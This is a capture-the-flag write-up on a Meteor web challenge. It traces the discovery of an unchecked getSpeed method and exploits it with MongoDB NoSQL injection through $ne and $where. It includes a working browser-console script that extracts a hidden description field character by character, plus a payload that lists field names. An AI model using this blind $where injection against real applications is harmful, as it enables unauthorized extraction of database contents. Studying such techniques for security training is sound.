# Writeup

### 1. Overview

By looking at the source we can determine that the site is using a framework called **Meteor**.

### 2. Looking for methods

If we click around and look at the network traffic, we can spot some methods like `getSpeed` and `getSize` being called through SockJS.

We can look at the main bundle JavaScript file and search for `Meteor.call`. The bundle is obfuscated, but this will give us enough information to call the methods.

For example there is this part of the bundle:

```js
Meteor.call('getPurpose', 'learn_more', ((e, l) => {
    e || t(l)
})),
Meteor.call('getAsteroidNames', ((e, t) => {
    e || s(t)
}))
```

After a bit of research about how Meteor methods work, we can try calling them by hand in the browser console:

```js
Meteor.call("getPurpose", "learn_more", console.log)
// outputs "asteroid collection"
```

### 3. Looking for a vulnerable method

We can look for two main classes of vulnerabilities:
1. General injections in string parameters (command injection, etc)
2. NoSQL injection, since **Meteor** uses **MongoDB**

The second type of injection would be possible if we could pass a special object - for example `{$ne: 1}` - as a parameter to one of these methods.

Most methods seem to have parameter type checks in place. For example, there is a method called `getSize`:

```js
Meteor.call("getSize", "Pallas", console.log)
// output 544
```

If we try to call it with a parameter of a different type, like `0` or `{}`, it errors out with a `Match failed` message.

This is what we would expect if the backend was using the `meteor/check` package to ensure the correct parameter type.

### 4. There is a vulnerable method

There is one method which is called in an interesting way:

```js
Meteor.call('getSpeed', {name: i}, !0, ((e, l) => { /*...*/ }))
```

It expects an object (and a boolean, that `!0` which evaluates to `true`), so maybe there's more we can do.

Trying:

```js
Meteor.call("getSpeed", {name: {$ne: "x"}}, true, console.log)
```

...seems to work and outputs some value!

### 5. Boolean?

There are different special variables we could try here, like `$regex` and `$where`.

Let's think about our goal. On each page there's a `Description: [TODO]` section, and one of the asteroids is `[[REDACTED]]`.

A valid guess is that we should **try getting their descriptions**, specifically the description of `[[REDACTED]]`.

This could be accomplished using `$where`, which can reach other fields existing on the collection we are querying against.

Let's try:

```js
Meteor.call("getSpeed", {$where: "true"}, true, console.log)
// 17.9
Meteor.call("getSpeed", {$where: "false"}, true, console.log)
// undefined
```

It seems to work! This means we can try extracting the description field using a boolean check.

### 6. Extracting data

The easiest way to proceed in my opinion is to **write a script in JS to be executed in the browser console on the challenge website**. It allows us to not deal with connecting to Meteor.

However doing it as a standalone script is also possible, for example using a npm module called `ddp`.

Extracting the flag:

```js

const charset = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&()*+,-./:;<=>?@[\\]^_`{|}~ \t\n\r\x0b\x0c";

const tryBoolean = (condition) => {
    return new Promise((resolve, reject) => {
        Meteor.call("getSpeed", {$where: condition}, true, async (err, result) => {
            return resolve(await result);
        });
    });
};

const run = async () => {
    let data = "";

    while(true) {
        let next = false;

        for (const char of charset) {
            const result = await tryBoolean(`this.name === '[[REDACTED]]' && this.description.startsWith('${data + char}')`);

            if (result !== undefined) {
                data += char;
                next = true;

                console.log(data);
                break;
            }
        }

        if (!next)
            break;
    }
}

run();
```

It is possible to extract the field names first, instead of guessing `name` and `description`, using this payload:

```js
const result = await tryBoolean(`Object.getOwnPropertyNames(this).join(",").startsWith('${data + char}')`);
// _id,name,size,speed,description,createdAt
```
